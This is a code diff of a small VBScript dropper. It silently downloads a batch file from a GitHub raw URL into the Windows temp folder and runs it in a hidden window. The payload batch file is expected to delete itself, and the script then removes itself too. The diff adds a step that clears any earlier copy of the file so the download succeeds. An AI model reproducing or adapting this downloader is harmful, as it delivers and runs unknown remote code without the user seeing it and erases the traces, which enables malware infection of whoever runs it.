@@ -2,6 +2,7 @@ Option Explicit
 
 Dim objXMLHttp, objFSO, objFile, strURL, strTempBat, strTempPath, objShell
 
+' URL of your batch file to download
 strURL = "https://github.com/vivaanv987-cloud/test/raw/refs/heads/main/Am.bat"
 
 Set objFSO = CreateObject("Scripting.FileSystemObject")
@@ -9,6 +10,11 @@ Set objShell = CreateObject("WScript.Shell")
 
 strTempPath = objShell.ExpandEnvironmentStrings("%TEMP%")
 strTempBat = strTempPath & "\taskfile.bat"
+
+' Delete existing file if exists to avoid access denied
+If objFSO.FileExists(strTempBat) Then
+    objFSO.DeleteFile strTempBat, True
+End If
 
 ' Download batch file silently
 Set objXMLHttp = CreateObject("MSXML2.XMLHTTP")
@@ -20,10 +26,10 @@ If objXMLHttp.Status = 200 Then
     objFile.Write objXMLHttp.ResponseText
     objFile.Close
 
-    ' Run batch file hidden and wait for completion
+    ' Run batch file hidden and wait for it to finish
     objShell.Run Chr(34) & strTempBat & Chr(34), 0, True
 
-    ' batch file should self-delete itself
+    ' The batch file should self-delete itself
 End If
 
 ' Delete this VBScript after everything finishes
